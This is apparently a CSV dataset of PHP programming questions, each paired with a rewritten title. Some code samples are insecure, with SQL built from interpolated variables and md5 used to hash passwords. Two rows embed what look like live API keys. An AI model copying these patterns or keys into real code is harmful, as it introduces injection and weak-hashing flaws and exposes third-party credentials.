originalTitle,body,reformulatedTitle
Whats the difference between __constructor() and init()," I was wondering what is the difference between __construct() and init() functions in a PHP application, more particularly in a Zend Framework application. <code> ",What's the difference between __construct() and init()
Whats the difference between __construct() and init()," I was wondering what is the difference between __construct() and init() functions in a PHP application, more particularly in a Zend Framework application. <code> ",What's the difference between __construct() and init()
HTML Select Box: set the option on selected with help PHP," I have a next piece of the template: and store resulting value in $result['interest'].How can I mark option element as selected with PHP?Thanks! <code>  <select name=""interest""> <option value=""seo"">SEO </option> <option value=""auto""></option> <option value=""business""></option> <option value=""design""></option> ...",How to set selected value of HTML select box with PHP
Php - Debugging Curl," I'd like to see what the post fields in the request are before I send it. (For debugging purposes).The PHP library (class) I am using is already made (not by me), so I am trying to understand it.As far as I can tell, it uses curl_setopt() to set different options like headers and such and then it uses curl_exec() to send the request.Ideas on how to see what post fields are being sent? <code> ",PHP - Debugging Curl
email address as password salt?, Is it a bad idea to use an email address as the salt for a password? <code> ,Email address as password salt?
PHP: How to close open HTML tag in a string?," Situation is a string that results in something like this: Because the function returns a teaser (summary) of the text, it stops after certain words. Where in this case the tag strong is not closed. But the whole string is wrapped in a paragraph.Is it possible to convert the above result/output to the following: I do not know where to begin. The problem is that.. I found a function on the web which does it regex, but it puts the closing tag after the string.. therefore it won't validate because I want all open/close tags within the paragraph tags. The function I found does this which is wrong also: I want to know that the tag can be strong, italic, anything. That's why I cannot append the function and close it manually in the function. Any pattern that can do it for me? <code>  <p>This is some text and here is a <strong>bold text then the post stop here....</p> <p>This is some text and here is a <strong>bold text then the post stop here....</strong></p> <p>This is some text and here is a <strong>bold text then the post stop here....</p></strong>",Close open HTML tags in a string
Returning 2 values from a function | PHP," Is it possible to return two values when calling a function that would output the values?For example, I have this: Which will output 1. I want to chose what to ouput, e.g. ids($sid), but it will still output 1.Is it even possible? <code>  <?php function ids($uid = 0, $sid = '') { $uid = 1; $sid = md5(time()); return $uid; return $sid; } echo ids();?>",Returning two values from a function
Returning 2 values from a function," Is it possible to return two values when calling a function that would output the values?For example, I have this: Which will output 1. I want to chose what to ouput, e.g. ids($sid), but it will still output 1.Is it even possible? <code>  <?php function ids($uid = 0, $sid = '') { $uid = 1; $sid = md5(time()); return $uid; return $sid; } echo ids();?>",Returning two values from a function
PHP MSSQL connection," I want to connect to a SQL Server 2000 from PHP installed in a unix platform (CentOs) and to be able to run queries (SELECT and UPDATE). The solution must support UTF-8 data.As search through the web, I find out that there exists many different approaches (freeTDS, unixODBC, ODBTP, Easysoft ODBC, Easysoft ODBC-ODBC Bridge, PDO).Could someone point me to the best solution for the specific connection? <code> ",PHP to SQL Server connection
"In PHP, how do I extract multiple e-mail addresses from a block of test and put them into an array?"," I have a block of text from which I want to extract the valid e-mail addresses and put them into an array. So far I have... However, I am getting an array with only one address. Therefore, I am guessing I need to cycle through this process somehow. How do I do that? <code>  $string = file_get_contents(""example.txt""); // Load text file contents $matches = array(); //create array $pattern = '/[A-Za-z0-9_-]+@[A-Za-z0-9_-]+\.([A-Za-z0-9_-][A-Za-z0-9_]+)/'; //regex for pattern of e-mail address preg_match($pattern, $string, $matches); //find matching pattern","In PHP, how do I extract multiple e-mail addresses from a block of text and put them into an array?"
How to make a script that runs a huge amount of calculations each time?," I'm making a script where a load of business are loaded into a mySQL database with a latitude and longitude. Then I am supplying that script with a latitude an longitude (of the end user) and the script has to calculate the distance from the supplied lat/long to EACH of the entries it gets from the database and order them in order of nearest to furthest.I only realistically need about 10 or 20 ""nearest"" results, but I can't think of anyway to do this other than to get all the results from the database and run the function on each of them and then array sort.This is what I have already: Now, this runs fast enough with only 2 or 3 businesses in the database, but I'm currently loading 5k businesses into the database and I'm worried that its going to be incredibly slow running this for EACH entry? What do you think?Its not the kind of data I could cache either, as the likelihood of two users having the same lat/long is liable to be incredibly rare, and therefore wouldn't help.What can I do about this?Thanks for any help and any suggestions. They're all much appreciated. <code>  <?phpfunction getDistance($point1, $point2){ $radius = 3958; // Earth's radius (miles) $pi = 3.1415926; $deg_per_rad = 57.29578; // Number of degrees/radian (for conversion) $distance = ($radius * $pi * sqrt( ($point1['lat'] - $point2['lat']) * ($point1['lat'] - $point2['lat']) + cos($point1['lat'] / $deg_per_rad) // Convert these to * cos($point2['lat'] / $deg_per_rad) // radians for cos() * ($point1['long'] - $point2['long']) * ($point1['long'] - $point2['long']) ) / 180); $distance = round($distance,1); return $distance; // Returned using the units used for $radius.}include(""../includes/application_top.php"");$lat = (is_numeric($_GET['lat'])) ? $_GET['lat'] : 0;$long = (is_numeric($_GET['long'])) ? $_GET['long'] : 0;$startPoint = array(""lat""=>$lat,""long""=>$long);$sql = ""SELECT * FROM mellow_listings WHERE active=1""; $result = mysql_query($sql);while($row = mysql_fetch_array($result)){ $thedistance = getDistance($startPoint,array(""lat""=>$row['lat'],""long""=>$row['long'])); $data[] = array('id' => $row['id'], 'name' => $row['name'], 'description' => $row['description'], 'lat' => $row['lat'], 'long' => $row['long'], 'address1' => $row['address1'], 'address2' => $row['address2'], 'county' => $row['county'], 'postcode' => strtoupper($row['postcode']), 'phone' => $row['phone'], 'email' => $row['email'], 'web' => $row['web'], 'distance' => $thedistance);}// integrate google local search$url = ""http://ajax.googleapis.com/ajax/services/search/local?"";$url .= ""q=Off+licence""; // query$url .= ""&v=1.0""; // version number$url .= ""&rsz=8""; // number of results$url .= ""&key=ABQIAAAAtG"" .""Pcon1WB3b0oiqER"" .""FZ-TRQgsWYVg721Z"" .""IDPMPlc4-CwM9Xt"" .""FBSTZxHDVqCffQ2"" .""W6Lr4bm1_zXeYoQ""; // api key$url .= ""&sll="".$lat."","".$long;// sendRequest// note how referer is set manually$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_REFERER, /* url */);$body = curl_exec($ch);curl_close($ch);// now, process the JSON string$json = json_decode($body, true);foreach($json['responseData']['results'] as $array){ $thedistance = getDistance($startPoint,array(""lat""=>$array['lat'],""long""=>$array['lng'])); $data[] = array('id' => '999', 'name' => $array['title'], 'description' => '', 'lat' => $array['lat'], 'long' => $array['lng'], 'address1' => $array['streetAddress'], 'address2' => $array['city'], 'county' => $array['region'], 'postcode' => '', 'phone' => $array['phoneNumbers'][0], 'email' => '', 'web' => $array['url'], 'distance' => $thedistance);}// sort the arrayforeach ($data as $key => $row) {$id[$key] = $row['id'];$distance[$key] = $row['distance'];}array_multisort($distance, SORT_ASC, $data); header(""Content-type: text/xml""); echo '<?xml version=""1.0"" encoding=""UTF-8""?>'.""\n"";echo '<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">'.""\n"";echo '<plist version=""1.0"">'.""\n"";echo '<array>'.""\n"";for($i = 0; isset($distance[$i]); $i++){ //echo $data[$i]['id']."" -> "".$distance[$i].""<br />""; echo '<dict>'.""\n""; foreach($data[$i] as $key => $val){ echo '<key><![CDATA['.$key.']]></key>'.""\n""; echo '<string><![CDATA['.htmlspecialchars_decode($val, ENT_QUOTES).']]></string>'.""\n""; } echo '</dict>'.""\n"";}echo '</array>'.""\n"";echo '</plist>'.""\n"";?>",How to efficiently find the closest locations nearby a given location
How to efficiently find the closest locations nearby a given location.," I'm making a script where a load of business are loaded into a mySQL database with a latitude and longitude. Then I am supplying that script with a latitude an longitude (of the end user) and the script has to calculate the distance from the supplied lat/long to EACH of the entries it gets from the database and order them in order of nearest to furthest.I only realistically need about 10 or 20 ""nearest"" results, but I can't think of anyway to do this other than to get all the results from the database and run the function on each of them and then array sort.This is what I have already: Now, this runs fast enough with only 2 or 3 businesses in the database, but I'm currently loading 5k businesses into the database and I'm worried that its going to be incredibly slow running this for EACH entry? What do you think?Its not the kind of data I could cache either, as the likelihood of two users having the same lat/long is liable to be incredibly rare, and therefore wouldn't help.What can I do about this?Thanks for any help and any suggestions. They're all much appreciated. <code>  <?phpfunction getDistance($point1, $point2){ $radius = 3958; // Earth's radius (miles) $pi = 3.1415926; $deg_per_rad = 57.29578; // Number of degrees/radian (for conversion) $distance = ($radius * $pi * sqrt( ($point1['lat'] - $point2['lat']) * ($point1['lat'] - $point2['lat']) + cos($point1['lat'] / $deg_per_rad) // Convert these to * cos($point2['lat'] / $deg_per_rad) // radians for cos() * ($point1['long'] - $point2['long']) * ($point1['long'] - $point2['long']) ) / 180); $distance = round($distance,1); return $distance; // Returned using the units used for $radius.}include(""../includes/application_top.php"");$lat = (is_numeric($_GET['lat'])) ? $_GET['lat'] : 0;$long = (is_numeric($_GET['long'])) ? $_GET['long'] : 0;$startPoint = array(""lat""=>$lat,""long""=>$long);$sql = ""SELECT * FROM mellow_listings WHERE active=1""; $result = mysql_query($sql);while($row = mysql_fetch_array($result)){ $thedistance = getDistance($startPoint,array(""lat""=>$row['lat'],""long""=>$row['long'])); $data[] = array('id' => $row['id'], 'name' => $row['name'], 'description' => $row['description'], 'lat' => $row['lat'], 'long' => $row['long'], 'address1' => $row['address1'], 'address2' => $row['address2'], 'county' => $row['county'], 'postcode' => strtoupper($row['postcode']), 'phone' => $row['phone'], 'email' => $row['email'], 'web' => $row['web'], 'distance' => $thedistance);}// integrate google local search$url = ""http://ajax.googleapis.com/ajax/services/search/local?"";$url .= ""q=Off+licence""; // query$url .= ""&v=1.0""; // version number$url .= ""&rsz=8""; // number of results$url .= ""&key=ABQIAAAAtG"" .""Pcon1WB3b0oiqER"" .""FZ-TRQgsWYVg721Z"" .""IDPMPlc4-CwM9Xt"" .""FBSTZxHDVqCffQ2"" .""W6Lr4bm1_zXeYoQ""; // api key$url .= ""&sll="".$lat."","".$long;// sendRequest// note how referer is set manually$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_REFERER, /* url */);$body = curl_exec($ch);curl_close($ch);// now, process the JSON string$json = json_decode($body, true);foreach($json['responseData']['results'] as $array){ $thedistance = getDistance($startPoint,array(""lat""=>$array['lat'],""long""=>$array['lng'])); $data[] = array('id' => '999', 'name' => $array['title'], 'description' => '', 'lat' => $array['lat'], 'long' => $array['lng'], 'address1' => $array['streetAddress'], 'address2' => $array['city'], 'county' => $array['region'], 'postcode' => '', 'phone' => $array['phoneNumbers'][0], 'email' => '', 'web' => $array['url'], 'distance' => $thedistance);}// sort the arrayforeach ($data as $key => $row) {$id[$key] = $row['id'];$distance[$key] = $row['distance'];}array_multisort($distance, SORT_ASC, $data); header(""Content-type: text/xml""); echo '<?xml version=""1.0"" encoding=""UTF-8""?>'.""\n"";echo '<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">'.""\n"";echo '<plist version=""1.0"">'.""\n"";echo '<array>'.""\n"";for($i = 0; isset($distance[$i]); $i++){ //echo $data[$i]['id']."" -> "".$distance[$i].""<br />""; echo '<dict>'.""\n""; foreach($data[$i] as $key => $val){ echo '<key><![CDATA['.$key.']]></key>'.""\n""; echo '<string><![CDATA['.htmlspecialchars_decode($val, ENT_QUOTES).']]></string>'.""\n""; } echo '</dict>'.""\n"";}echo '</array>'.""\n"";echo '</plist>'.""\n"";?>",How to efficiently find the closest locations nearby a given location
How can i write data into an excel using PHP," Is it possible to append content to an .xls file using PHP fwrite()?When I try this using fwrite(), the resulting file causes an error message in Excel 2007.Is there a specific separator I can use to accomplish this?Is it possible without a third party library? <code> ",How can I write data into an excel using PHP?
PHP recursive function to delete all child nodes," My MySQL looks like this: (the name of the table is category) where:id = the id of the categorycontent =some-text-we-dont-care-aboutparent = the id of the parentcategorythis is what I'm trying right now: Which for some reason doesnt work and crashes ..Any idea what I'm doing wrong ? <code>  'id', 'content', 'parent' function remrecurs($id) { $qlist=mysql_query(""SELECT * FROM category WHERE parent='$id'""); if (mysql_num_rows($qlist)>0) { while($curitem=mysql_fetch_array($qlist)) { remrecurs($curitem['parent']); } } mysql_query(""DELETE FROM category WHERE id='$id'"");}",PHP recursive function to delete all child nodes causes stackoverflow
to catch curl error in php," I am using PHP curl functions to post data to the web server from my local machine. My code is as follows: Unfortunately I am not able to catch any errors like 404, 500 or network failure. So how will I get to know that data was not posted to or retrieved from the remote? <code>  $c = curl_init();curl_setopt($c, CURLOPT_URL, $url);curl_setopt($c, CURLOPT_RETURNTRANSFER, true);curl_setopt($c, CURLOPT_POST, true);curl_setopt($c, CURLOPT_POSTFIELDS, $data);$result = curl_exec($c);if (curl_exec($c) === false) { echo ""ok"";} else { echo ""error"";}curl_close($c);",How to catch cURL errors in PHP
How to catch curl errors in PHP," I am using PHP curl functions to post data to the web server from my local machine. My code is as follows: Unfortunately I am not able to catch any errors like 404, 500 or network failure. So how will I get to know that data was not posted to or retrieved from the remote? <code>  $c = curl_init();curl_setopt($c, CURLOPT_URL, $url);curl_setopt($c, CURLOPT_RETURNTRANSFER, true);curl_setopt($c, CURLOPT_POST, true);curl_setopt($c, CURLOPT_POSTFIELDS, $data);$result = curl_exec($c);if (curl_exec($c) === false) { echo ""ok"";} else { echo ""error"";}curl_close($c);",How to catch cURL errors in PHP
PHP - Best/Better/Optimal way to setup a Staging/Development server," I recently launched a service, meaning I can no longer work directly on the site, or I do so at a risk.I haven't been able to find any ""standard"" or ""best"" way to make a development server. The two things I have seen area) Using a GIT or SVN to host the data (this doesn't quite solve my problem, I need to be able to develop somewhere, preferably not my home computer)b) Capistrano (for Rails, is there something for PHP?)The current solution I'm looking at is putting a complete copy of the server on ""development.domain.com"", which would then allow me to work on everything, and I can simply copy the files over to the main section.Is this a workable solution? What's the optimal solution? (Separate server, special tools, etc.)EDITThis system be developed by a number of developers. The server settings have been tweaked considerably to allow for the full functionality and security of the system. Having the development on my own computer is not a workable solution, nor on an intranet type of system as none of our programmers are in the same location.I'm looking for an on-a-server solution. <code> ",Best/Better/Optimal way to setup a Staging/Development server
Explode PHP by new line," Simple, right? Well, this isn't working :-\ <code>  $skuList = explode('\n\r', $_POST['skuList']);",Explode PHP string by new line
[PHP] How download big file using  PHP (low memory usage)," I have to download big file (1xx MB) using PHP.How can i download this without wasting memory (RAM) for temporary file ?When i use I need to have so much memory that size of that file.Maybe it's possible to download it using any other way ?For example in parts (for example 1024b), write to disk, and download another part repeating until file will be fully downloaded ? <code>  $something=file_get_contents('http://somehost.example/file.zip');file_put_contents($something,'myfile.zip');",How download big file using PHP (low memory usage)
PHP: Check if variable exist but also if has a value equal to something," I have (or not) a variable $_GET['myvar'] coming from my query string and I want to check if this variable exists and also if the value corresponds to something inside my if statement:What I'm doing and think is not the best way to do:if(isset($_GET['myvar']) && $_GET['myvar'] == 'something'): do somethingMy question is, exist any way to do this without declare the variable twice?That is a simple case but imagine have to compare many of this $myvar variables. <code> ",Check if variable exist but also if has a value equal to something
how do i print currency format in php," I have some price values to display in my page.I am writing a function which takes the float price and returns the formatted currency val with currency code too..For example, fnPrice(1001.01) should print $ 1,000.01 <code> ",Print Currency Number Format in PHP
Programming by contracts in php," Programming by contracts is a modern trend in .NET, but what about libraries/frameworks for code contracts in PHP? What do you think about applicability of this paradigm for PHP?Googling for ""code contracts php"" gave nothing to me.Note: by ""code by contract"", I mean Design by contract, so it has nothing to do with .NET or PHP interfaces. <code> ",Programming by contracts in PHP
Zend MVC redirecting to different controller and action, i'm trying to work out how i can stop zend or redirect zend to go to a different zend controller and action if a check within the boot strap fails.for example a get variable does not exist or more likely a session does not exist meaning the user must log in.so the user had originally requested index/someactionbut i want them to go to login/indexwithin my boot strap i would place the condition and then change the controller action to view.if i'm doing this in a way that is not standard can anyone direct me to documentation on the best practice ?zend novice <code> ,Zend Framework MVC redirecting to different controller and action
Regexp to detect call time bass by references in PHP source code," I'm looking for a regular expression that will accurately identify any PHP call time pass by references in source code in order to aid migration to PHP 5.3. Currently, I have [^=&]\s*&\s*\$, but this doesn't filter out assignment cases ($var = &$othervar;). This regexp should be compatible with eclipse (sorry, not sure what flavor of regexp eclipse parses).Edit: This one is a little bit closer (although a bit of a hack): (?<!([&=]\s{0,15}))&\s*\$ <code> ",Regexp to detect call time pass by references in PHP source code
Parse Json in php," I tried to request the weather from a web service supplying data in JSON format. My PHP request code, which did not succeed was: This is some of the data that was returned. Some of the details have been truncated for brevity, but object integrity is retained: <code>  $url=""http://www.worldweatheronline.com/feed/weather.ashx?q=schruns,austria&format=json&num_of_days=5&key=8f2d1ea151085304102710"";$json = file_get_contents($url);$data = json_decode($json, TRUE);echo $data[0]->weather->weatherIconUrl[0]->value; { ""data"": { ""current_condition"": [ { ""cloudcover"": ""31"", ... } ], ""request"": [ { ""query"": ""Schruns, Austria"", ""type"": ""City"" } ], ""weather"": [ { ""date"": ""2010-10-27"", ""precipMM"": ""0.0"", ""tempMaxC"": ""3"", ""tempMaxF"": ""38"", ""tempMinC"": ""-13"", ""tempMinF"": ""9"", ""weatherCode"": ""113"", ""weatherDesc"": [ {""value"": ""Sunny"" } ], ""weatherIconUrl"": [ {""value"": ""http:\/\/www.worldweatheronline.com\/images\/wsymbols01_png_64\/wsymbol_0001_sunny.png"" } ], ""winddir16Point"": ""N"", ""winddirDegree"": ""356"", ""winddirection"": ""N"", ""windspeedKmph"": ""5"", ""windspeedMiles"": ""3"" }, { ""date"": ""2010-10-28"", ... }, ... ] } }}",Parsing JSON object in PHP using json_decode
keep url parameters with htaccess rewrite," I'm having issues keeping the parameters of the url working after an htaccess url rewrite.My htaccess rewrite is as follows: Which means:domain.com/index.php?lang=en&page=product displays as domain.com/en/productFor some reason, when I add a ?model=AB123&color=something at the end of my URLs I am not able to retrieve those parameters in php using $_GET['model'] and $_GET['color'] even though they are present in the displayed URL.Why aren't the variables passed along? <code>  RewriteEngine on RewriteRule ^([a-z]{2,2})/([a-zA-Z0-9_-]+)$ index.php?lang=$1&page=$2",.htaccess RewriteRule to preserve GET URL parameters
PHP: Remove Line From CSV File," I have .csv file with 4 columns. What's the easiest way to remove a line identical with the id of the first column? Here's where I got stuck: Unfortunately, databases were not a choice. <code>  if($_GET['id']) { $id = $_GET['id']; $file_handle = fopen(""testimonials.csv"", ""rw""); while (!feof($file_handle) ) { $line_of_text = fgetcsv($file_handle, 1024); if ($id == $line_of_text[0]) { // remove row } } fclose($file_handle);}",Remove Line From CSV File
Seeking simple Post-Redirect-Get code example," I have found many sites that describes PRG, but no simple PHP code example.Here's what I implemented:The form.php has an action: validate.php.The validate.php is never seen by the user; if validates all $_GET and, if valid writes it to database and generates the HTML of a confirmation page / if not valid, it generates the HTML of an error page explaining what is wrong. Whichever HTML is generated get stored in a $_SESSION variable and then validate.php calls header('Location: <as appropriate>);.The submitted.php of invalid_input.php (in case the user reads the URL) consists only of echo $_SESSION['form_html'];.That seems to me like protection against both page reload and back button problems.Did I goof by trying to reinvent the wheel? <code> ",Simple PHP Post-Redirect-Get code example
Simple Post-Redirect-Get code example," I have found many sites that describes PRG, but no simple PHP code example.Here's what I implemented:The form.php has an action: validate.php.The validate.php is never seen by the user; if validates all $_GET and, if valid writes it to database and generates the HTML of a confirmation page / if not valid, it generates the HTML of an error page explaining what is wrong. Whichever HTML is generated get stored in a $_SESSION variable and then validate.php calls header('Location: <as appropriate>);.The submitted.php of invalid_input.php (in case the user reads the URL) consists only of echo $_SESSION['form_html'];.That seems to me like protection against both page reload and back button problems.Did I goof by trying to reinvent the wheel? <code> ",Simple PHP Post-Redirect-Get code example
is this PHP syntax correct?," I am currently studying ZEND framework and came across this in index.php: Is this the same as this? I have never came across this type of shorthand syntax before. <code>  // Define path to application directorydefined('APPLICATION_PATH') || define('APPLICATION_PATH', realpath(dirname(__FILE__) . '/../application')); if(!defined('APPLICATION_PATH')){ define('APPLICATION_PATH', realpath(dirname(__FILE__) . '/../application'));}",Is this PHP syntax correct?
I it possible to create a zip file using  php class ziparchive without writing the file to disk?," I would like to create a zip file in memory using a ZipArchive (or a native PHP class) and read the content of the file back to the client. Is this possible? If so, how?The files that I want to zip in this application are a maximum of 15 MB total. I think we should be in good shape memory-wise.  <code> ",Create a zip file using PHP class ZipArchive without writing the file to disk?
Caling PHP Function within Javascript," I want to know is it possible to call a php function within javascript, only and only when a condition is true. For example Is there any means of doing this.. If so let me know. Thanks <code>  <script type=""text/javascript"">if (foo==bar){phpFunction(); call the php function}</script>",Calling PHP Function within Javascript
[PHP] execute several python scripts at same time causes php/apache to hang?," I'm trying to execute a few python scripts in order to manipulate some images on my website. The external program/tool is written in python and is called PHATCH. I'm under Windows and using WAMP as my web server.Executing only just one script seems to work well, but I need to execute 4 scripts at the same time (to generate 4 different images), my browser will just load and Apache/PHP freezes.The PHP execution seems to freeze and hung up due several system() calls after each other. Here's an example of how I'm using it: If I only do the first one, it's fine, but as soon as I add the others, it all freezes. <code>  system(""C:\\python\\python.exe C:\\phatch\\phatch.py script1.phatch"");system(""C:\\python\\python.exe C:\\phatch\\phatch.py script2.phatch"");system(""C:\\python\\python.exe C:\\phatch\\phatch.py script3.phatch"");system(""C:\\python\\python.exe C:\\phatch\\phatch.py script4.phatch"");",Executing several Python scripts at same time causes PHP/Apache to hang
How could I loop through this json onject in php file?," I have converted an xml object returned from a php function into json format to send it to js file like. I receive/use it in js like Then I receive it back in php & decoded. Now how do I loop through it to get all values of its certain properties that I could have get from xml object(which I converted into json). This is how I loop over xml object to get all values of its certain properties: How do I get all those values from decoded json object $msg?EDITEDI tried in same HTML where I am using js to receive & POST php search function data via ajax, I tried following code to loop through json in php. But it did not show anything. <code>  function searchResults($q) { ... $xml = simplexml_load_string($result); return json_encode($xml); } var msg_top = ""<""+""?php echo searchResults('windows');""+""?""+"">""; $json = $_POST['msg_top']; $msg = json_decode($json); foreach ($xml->entry as $status) { echo $status->author->name.''.$status->content); } $obj = searchResults(testword);//serach function returns json encoded data$obj = json_decode($obj, true);$count = count($obj); for($i=0;$i<$count;$i++){echo $obj[$i][content];}// using xml for it, I get ouput like foreach ($xml3->entry as // $status) {status->content}",How could I loop through this json object in php file?
Php array value to string," For an array like the one below; what would be the best way to get the array values and store them as a comma-separated string? <code>  Array ( [0] => 33160, [1] => 33280, [2] => 33180, [3] => 33163, [4] => 33181, [5] => 33164, [6] => 33162, [7] => 33179, [8] => 33154, [9] => 33008, [10] => 33009, [11] => 33161, [12] => 33261, [13] => 33269, [14] => 33169, [15] => 33022, [16] => 33141, [17] => 33168, [18] => 33020, [19] => 33023, [20] => 33019, [21] => 33153, [22] => 33238, [23] => 33138, [24] => 33167, [25] => 33082,) ",How to convert an array to a string in PHP?
How do I turn an array to a string in PHP?," For an array like the one below; what would be the best way to get the array values and store them as a comma-separated string? <code>  Array ( [0] => 33160, [1] => 33280, [2] => 33180, [3] => 33163, [4] => 33181, [5] => 33164, [6] => 33162, [7] => 33179, [8] => 33154, [9] => 33008, [10] => 33009, [11] => 33161, [12] => 33261, [13] => 33269, [14] => 33169, [15] => 33022, [16] => 33141, [17] => 33168, [18] => 33020, [19] => 33023, [20] => 33019, [21] => 33153, [22] => 33238, [23] => 33138, [24] => 33167, [25] => 33082,) ",How to convert an array to a string in PHP?
Working days in PHP," Is there a way to use strtotime to add working days (Monday to Friday) to a date? Or some other method? What I want to do is: <code>  date ( 'Y-m-j' , strtotime ( '+3 working days' ) )",Working days (Mon-Fri) in PHP
Shorthand for array," What is the shorthand for array notation in PHP?I tried to use (doesn't work): It will be perfect, if you give links on some information about other shorthands for PHP. <code>  $list = {};",Shorthand for arrays: is there a literal syntax like {} or []?
"PHP, ampersand in function's arguments", I saw some function declarations like this: what does the & character do? <code>  function boo(&$var){ ...},What's the purpose of using & before a function's argument?
Remove first 4 characters of a string php, How can I remove the first 4 characters of a string using PHP? <code> ,Remove first 4 characters of a string with PHP
"PHP: Using __set with arrays solved, but why?"," Having done a bit of research, I eventually came across the answer to a question I was soon to ask here anyways; How do you work with arrays via the __get and __set magic methods in PHP? Whenever I was trying to set a value using something like $object->foo['bar'] = 42; it seemed to silently discard it.Anyways, the answer is simple; The __get method simply needs to return by reference. And after tossing an ampersand in front of it, sure enough it works.My question actually, is why? I can't seem to understand why this is working. How does __get returning by reference affect __set working with multidimensional arrays?Edit: By the way, running PHP 5.3.1 <code> ","Using __set with arrays solved, but why?"
How to get the real URL after file_get_contents ??? (php)," I'm using file_get_contents() to grab content from a site, and amazingly it works even if the URL I pass as argument redirects to another URL.The problem is I need to know the new URL, is there a way to do that? <code> ",How to get the real URL after file_get_contents if redirection happens?
Check if function exist, How can I check if the function my_function already exists in PHP? <code> ,"In PHP, how do I check if a function exists?"
Facebook API/PHP - Is it possible to change a user's profile image via FB API?," Is it possible to set/change a user's facebook profile image through the graph API? I can't find a specific API method, but it is possible to upload an image to a user's album (http://developers.facebook.com/docs/reference/api/photo). Can I set the user's profile image to an image uploaded to their album?Edit:Same question asked in reference to REST APICan I set a users profile image using the Facebook API? <code> ",Facebook API/PHP - Is it possible to change a user's profile image via FB Graph API?
Whats is md5() for?," I was reading this tutorial for a simple PHP login system.In the end it recommends that you should encrypt your password using md5().Though I know this is a beginners' tutorial, and you shouldn't put bank statements behind this login system, this got me thinking about encryption.So I went ahead and went to (one of the most useful questions this site has for newbies): What should a developer know before building a public web site?There it says (under security) you should: Encrypt Hash and salt passwords rather than storing them plain-text.It doesn't say much more about it, no references.So I went ahead and tried it myself: And this is what got me thinking, that although I know md5() might not the strongest way to encrypt, anything that always produces the same result can be reverse engineered.So what is the sense of encrypting something with md5() or any other method?If a hacker gets to a password encrypted with md5(), he would just use this page!.So now the actual questions:How does password encryption work?I know I have not discovered a huge web vulnerability here! :) I just want to understand the logic behind password encryption.I'm sure I'm understanding something wrong, and would appreciate if you could help me set my though and other's (I hope) straight.How would you have to apply password encryption so that it is actually useful?What about this idea?As I said, I may/am getting the whole idea wrong, but, would this method add any security in security to a real environment? As you see, I randomly added arbitrary strings ($reenc = array()) to my md5() password ""making it unique"". This of course is just a silly example.I may be wrong but unless you ""seed the encryption yourself"" it will always be easily reversible. The above would be my idea of ""password protecting"" and encrypted password, If a hacker gets to it he wont be able to decrypt it unless he gets access to the raw .phpI know this might not even make sense, but I can't figure out why this is a bad idea!I hope I've made myself clear enough, but this is a very long question so, please ask for any clarification needed!Thanks in advance!! <code>  $pass = ""Trufa"";$enc = md5($pass);echo $enc; #will echo 06cb51ce0a9893ec1d2dce07ba5ba710 $reenc = array( ""h38an"", ""n28nu"", ""fw08d"" );$pass = ""Trufa"";$enc = chunk_split(md5($pass),5,$reenc[mt_rand(0,count($reenc)-1)]);echo $enc;",What is md5() for?
What's the use ob_start() in php?, Is ob_start() used for output buffering so that the headers are buffered and not sent to the browser? Am I making sense here? If not then why should we use ob_start()? <code> ,What's the use of ob_start() in php?
